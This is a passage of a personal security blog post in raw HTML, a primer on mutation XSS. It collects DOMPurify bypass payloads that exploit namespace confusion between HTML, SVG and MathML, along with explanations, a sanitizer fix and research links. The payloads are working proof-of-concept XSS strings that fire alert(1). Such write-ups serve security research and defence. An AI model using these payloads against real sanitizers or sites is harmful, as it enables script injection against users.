</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>&lt;<span style="color:#f92672">plaintext</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">b</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#39;&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>&lt;<span style="color:#f92672">iframe</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">b</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#39;&gt;
</span></span></code></pre></div><p><strong>Fix by Dompurify for above issue:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">/* Tags to ignore content of when KEEP_CONTENT is true */</span>  <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">Just</span> <span style="color:#a6e22e">remove</span> <span style="color:#a6e22e">contents</span> <span style="color:#a6e22e">too</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FORBID_CONTENTS</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addToSet</span>({}, [ <span style="color:#e6db74">&#39;annotation-xml&#39;</span>, <span style="color:#e6db74">&#39;audio&#39;</span>, <span style="color:#e6db74">&#39;colgroup&#39;</span>, <span style="color:#e6db74">&#39;desc&#39;</span>, <span style="color:#e6db74">&#39;foreignobject&#39;</span>, <span style="color:#e6db74">&#39;head&#39;</span>, <span style="color:#e6db74">&#39;math&#39;</span>, <span style="color:#e6db74">&#39;mi&#39;</span>, <span style="color:#e6db74">&#39;mn&#39;</span>, <span style="color:#e6db74">&#39;mo&#39;</span>, <span style="color:#e6db74">&#39;ms&#39;</span>, <span style="color:#e6db74">&#39;mtext&#39;</span>, <span style="color:#e6db74">&#39;script&#39;</span>, <span style="color:#e6db74">&#39;style&#39;</span>, <span style="color:#e6db74">&#39;template&#39;</span>, <span style="color:#e6db74">&#39;thead&#39;</span>, <span style="color:#e6db74">&#39;title&#39;</span>, <span style="color:#e6db74">&#39;svg&#39;</span>, <span style="color:#e6db74">&#39;video&#39;</span>, ]);
</span></span></code></pre></div><h3 id="a-similar-masatos-above-variation-in-recent-version-by-kevin-mizu-restricteddompurify-308-2024">A similar masato’s above variation in recent version by kevin mizu restricted DOMPurify 3.0.8 2024</h3>
<p><strong>Switch:</strong> Style tag HTML to SVG
<strong>Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#e6db74">`&lt;svg&gt;&lt;annotation-xml&gt;&lt;foreignobject&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;p id=&#34;--&gt;&lt;img src=&#39;x&#39; onerror=&#39;alert(1)&#39;&gt;&#34;&gt;`</span>, {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#a6e22e">CUSTOM_ELEMENT_HANDLING</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>        <span style="color:#a6e22e">tagNameCheck</span><span style="color:#f92672">:</span> <span style="color:#e6db74">/.*/</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    },
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    <span style="color:#a6e22e">FORBID_CONTENTS</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#34;&#34;</span>]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>});
</span></span></code></pre></div><p><strong>Description:</strong></p>
<ul>
<li>The <!-- raw HTML omitted --> element is treated as a custom element due to the permissive custom element regex (tagNameCheck: /.*/). With FORBID_CONTENTS set to an empty array, both <!-- raw HTML omitted --> and <!-- raw HTML omitted --> within the <!-- raw HTML omitted --> are considered valid and aren&rsquo;t removed by the namespace checks. However, DOMPurify later removes <!-- raw HTML omitted -->, leaving its contents to be re-assigned as children of <!-- raw HTML omitted --> due forbid_contents set to empty. As a result, the <!-- raw HTML omitted --> tag (which normally belongs to the HTML namespace) is now nested inside the SVG&rsquo;s <!-- raw HTML omitted -->, allowing it to be treated as SVG content.</li>
</ul>
<h3 id="svg-to-html-switch-daniel-santos-bananabr">SVG to HTML switch:  Daniel Santos @bananabr</h3>
<p><strong>Description:</strong></p>
<ul>
<li>Another variation of the SecurityMB exploit involves a different switch, converting the style tag from the SVG namespace into the HTML namespace. This version uses two mtext elements, with the second mtext ensuring that the payload to stay in the HTML namespace for first parsing <em><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->.</em></li>
<li>During the second parsing, when the form is removed, elements mtext &gt; mglyph &gt; svg &gt; mtext will all be within the MathML namespace as mglyph child will be mathml until html namespace element comes. And the second mtext, the style tag transitions back into the HTML namespace, allowing the malicious code within the style tag to execute.</li>
</ul>
<p><strong>Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">mglyph</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;x id=&#34;&amp;lt;/style&gt;&lt;img onerror=alert(1) src&gt;&#34;&gt;</span>
</span></span></code></pre></div><h3 id="gareth-switch-mathml-style-to-html-style-added-with-comment-trick">Gareth: Switch MATHML style to HTML style added with comment trick</h3>
<p><strong>Payload:</strong>
<code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img title=&quot;--&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&quot;&gt;</code></p>
<p><strong>Description</strong>:</p>
<ul>
<li><em>1st Pass (P(D))</em>: During the first pass, the table moves(forstering parent) the mglyph element right beside the mtext, resulting in a structure like <!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->. At this stage, both mglyph and style are in the HTML namespace, so comments within the style tag are ignored, and HTML entities are decoded normally.</li>
<li><em>2nd Pass (P(P(D)))</em>: In the second parsing, mglyph is reinterpreted within the MathML namespace since it&rsquo;s adjacent to mtext. As a result, the style tag also switches to the MathML namespace. Now, in the MathML context, comments inside the style tag are no longer ignored. This causes the comment to be closed inside the title, and the hidden payload is executed.</li>
</ul>
<h4 id="some-other-variant">Some other variant</h4>
<p>*Switch: SVG style to HTML *</p>
<p><strong>Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;one&#39;</span>&gt;&lt;<span style="color:#f92672">audio</span>&gt;aa&lt;<span style="color:#f92672">altglyphdef</span>&gt;&lt;<span style="color:#f92672">animatecolor</span>&gt;&lt;<span style="color:#f92672">filter</span>&gt;&lt;<span style="color:#f92672">fieldset</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;two&#39;</span>&gt;&lt;/<span style="color:#f92672">fieldset</span>&gt;ccd&lt;/<span style="color:#f92672">a</span>&gt;gg&lt;<span style="color:#f92672">mglyph</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">a</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">#</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#39;&gt;
</span></span></code></pre></div><p><strong>Description</strong>: Since <!-- raw HTML omitted --> tags cannot be nested, they are initially treated together but later become sibling elements. The second <!-- raw HTML omitted --> tag brings subsequent <!-- raw HTML omitted --> elements as children of <!-- raw HTML omitted -->. As a result, <!-- raw HTML omitted --> initially inside a <!-- raw HTML omitted --> tag is reinterpreted as MathML <!-- raw HTML omitted --> because it becomes a child of an SVG&rsquo;s <!-- raw HTML omitted -->.</p>
<h3 id="by-someone">By someone</h3>
<p><strong>Switch: SVG style to HTML</strong>
<em>Payload:</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span> &lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">h1</span>&gt;&lt;<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">h6</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h6</span>&gt;&lt;<span style="color:#f92672">mglyph</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">a</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;alert(1)&#39;</span>&gt;&#34;&gt;&lt;/<span style="color:#f92672">style</span>&gt;
</span></span></code></pre></div><p><strong>Description:</strong>
Since <code>&lt;h&gt;</code> tags (e.g., <code>&lt;h1&gt;</code>, <code>&lt;h6&gt;</code>) cannot be nested, they are separated and become sibling elements. In the first parse (P(D)), <code>&lt;mtext&gt;</code> is nested within an SVG, but in the second parse (P(P(D))), a mutation occurs where <code>&lt;mglyph&gt;</code> becomes a direct child of <code>&lt;mtext&gt;</code> (top). This causes the <code>&lt;mtext&gt;</code> (bottom), initially in SVG in P(D), to be reinterpreted as a MathML <code>&lt;mtext&gt;</code> in P(P(D)).</p>
<h3 id="incorrect-serialization-of-at-rules-in-css-can-lead-to-css-injection---google-ctf-by-securitymb">Incorrect serialization of at-rules in CSS can lead to CSS injection - Google CTF by SecurityMB</h3>
<p>Chromium serialization of CSS (using the cssText property on CSS rules) doesn&rsquo;t escape names of certain at-rules, such as <code>@keyframes</code> or <code>@layer</code>. Consider the following keyframes rule:
<code>@keyframes abc\{\} {}</code>
After getting the cssText of the rule, the rule is serialized to:
<code>@keyframes abc{} {}</code></p>
<p>Links:
<a href="https://issues.chromium.org/issues/343000522">https://issues.chromium.org/issues/343000522</a>
<a href="https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows#intended-solution">https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows#intended-solution</a></p>
<h3 id="310-dompurify-bypass-with-nesting-by-icesfont">3.1.0 DOMPurify Bypass with nesting by icesfont</h3>
<p>TBD  after the part 1 video will update, this is banger of a bug</p>
<h4 id="some-miscellaneous-brainstorming">Some miscellaneous brainstorming</h4>
<p>XMLSerializer.serializeToString(), like Google Closure lib or do a similar processing. ? Is it safe?
Note: insertAdjacentHTML is fragment parsing mode, for instance <!-- raw HTML omitted --><!-- raw HTML omitted --> is allowed in fragment parsing mode but not document parsing mode, so if its parsed in fragment first then innerhtml u can mxss using initial securitymb <code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=”&lt;/style&gt;&lt;img&gt;”&gt;</code></p>
<p>Copypaste sanitizer mxss
<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1011950">https://bugs.chromium.org/p/chromium/issues/detail?id=1011950</a>
<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1065761">https://bugs.chromium.org/p/chromium/issues/detail?id=1065761</a></p>
<p>Brainstorm:
Why build or use a spec complaint parser during sanitization</p>
<p>Why not use a parser that doesn’t mutate anymore.</p>
<p>P(P(D)) =/ P(D)
P(P(D)) = P(D)</p>
<!-- raw HTML omitted -->
<h4 id="some-misc-links">some misc links</h4>
<p><a href="https://research.securitum.com/dompurify-bypass-using-mxss/">https://research.securitum.com/dompurify-bypass-using-mxss/</a></p>
<p><a href="https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/">https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/</a></p>
<p><a href="https://sonarsource.github.io/mxss-cheatsheet/">https://sonarsource.github.io/mxss-cheatsheet/</a></p>
<p><a href="https://cure53.de/fp170.pdf">https://cure53.de/fp170.pdf</a></p>
<p><a href="https://2021.swisscyberstorm.com/2021/10/17/Mario_Heiderich_-_mXSS_in_2021_One_long_solved_problem.pdf">https://2021.swisscyberstorm.com/2021/10/17/Mario_Heiderich_-_mXSS_in_2021_One_long_solved_problem.pdf</a></p>
<p><a href="http://www.webkit.org/projects/layout/index.html">http://www.webkit.org/projects/layout/index.html</a></p>
<p><a href="https://web.dev/articles/howbrowserswork">https://web.dev/articles/howbrowserswork</a></p>
<p><a href="https://www.youtube.com/watch?v=QBkLI35sxVs">https://www.youtube.com/watch?v=QBkLI35sxVs</a></p>
<p><a href="https://aszx87410.github.io/beyond-xss/en/ch2/mutation-xss/">https://aszx87410.github.io/beyond-xss/en/ch2/mutation-xss/</a></p>
<p><a href="https://issues.chromium.org/issues/40050167#c_ts1574850321">https://issues.chromium.org/issues/40050167#c_ts1574850321</a> : spec bug</p>
<p><a href="http://software.hixie.ch/utilities/js/live-dom-viewer/?saved=7497">http://software.hixie.ch/utilities/js/live-dom-viewer/?saved=7497</a></p>
<p><a href="https://html.spec.whatwg.org/multipage/parsing.html#misnested-tags:-b-i-/b-/i">https://html.spec.whatwg.org/multipage/parsing.html#misnested-tags:-b-i-/b-/i</a></p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Posts</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&text=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&title=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&is_video=false&description=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&title=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&title=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&name=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS&description=%3cp%3e%3cstrong%3eMXSS%20Evolution%20and%20Timeline%3c%2fstrong%3e%3c%2fp%3e%0a%3cp%3eNote%20this%20a%20document%20which%20I%20created%20while%20working%20on%20the%20MXSS%20video%20series%20%3ca%20href%3d%22https%3a%2f%2fyoutu.be%2faczTceXp49U%22%3ehttps%3a%2f%2fyoutu.be%2faczTceXp49U%3c%2fa%3e%2c%20its%20very%20raw%20just%20random%20thoughts%20added%20here%2c%20if%20you%20want%20anything%20to%20change.%20feel%20free%20to%20pr.%3c%2fp%3e%0a%3ch3%20id%3d%22how-do-html-sanitizers-work%22%3e%3cstrong%3eHow%20Do%20HTML%20Sanitizers%20Work%3f%3c%2fstrong%3e%3c%2fh3%3e%0a%3cp%3eSanitizers%20are%20tools%20designed%20to%20filter%20harmful%20content%20from%20HTML%2c%20making%20it%20safe%20to%20insert%20into%20a%20webpage.%20The%20process%20involves%20several%20steps%3a%3c%2fp%3e%0a%3col%3e%0a%3cli%3e%3cstrong%3eParsing%3a%3c%2fstrong%3e%20The%20HTML%20content%20is%20parsed%20into%20a%20DOM%20tree%20on%20either%20the%20server%20or%20in%20the%20browser.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eSanitization%3a%3c%2fstrong%3e%20The%20sanitizer%20iterates%20through%20the%20DOM%20tree%20to%20remove%20dangerous%20or%20harmful%20content.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eSerialization%3a%3c%2fstrong%3e%20After%20sanitizing%2c%20the%20DOM%20tree%20is%20serialized%20back%20into%20an%20HTML%20string.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eRe-parsing%3a%3c%2fstrong%3e%20The%20serialized%20HTML%20is%20assigned%20to%20%3ccode%3einnerHTML%3c%2fcode%3e%2c%20triggering%20another%20parsing%20process.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eAppending%20to%20Document%3a%3c%2fstrong%3e%20The%20final%2c%20sanitized%20DOM%20tree%20is%20appended%20to%20the%20document.%3c%2fli%3e%0a%3c%2fol%3e%0a%3cp%3eHowever%2c%20despite%20these%20steps%2c%20sanitizers%e2%80%94especially%20server-side%20ones%e2%80%94can%20fail%20due%20to%20%3cstrong%3eparser%20differentials%3c%2fstrong%3e%20between%20server%20and%20client.%20A%20server-side%20sanitizer%20might%20miss%20dangerous%20content%20that%20behaves%20differently%20when%20parsed%20by%20a%20browser.%20A%20typical%20example%20is%20when%20content%20is%20treated%20as%20RAWTEXT%20on%20the%20server%20but%20as%20active%20HTML%20in%20the%20browser.%3c%2fp%3e" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&t=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  Copyright © s1r1us 
    
      
    
      
      
      
        <a class="icon" target="_blank" rel="noopener" href="https://github.com/ElecmsrkptrovoltSec" aria-label="github">
          <i class="fab fa-github" aria-hidden="true"></i>
        </a>
        
      
      
        <a class="icon" target="_blank" rel="noopener" href="mailto:l33tsirius@gmail.com" aria-label="Email">
          <i class="fas fa-envelope" aria-hidden="true"></i>
        </a>
        
      
      
        <a class="icon" target="_blank" rel="noopener" href="https://twitter.com/s1r1u5_" aria-label="twitter">
          <i class="fab fa-twitter" aria-hidden="true"></i>
        </a>
        
      
      
    
  
  </div>
  <div class="footer-right">
    <nav>
    
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Posts</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
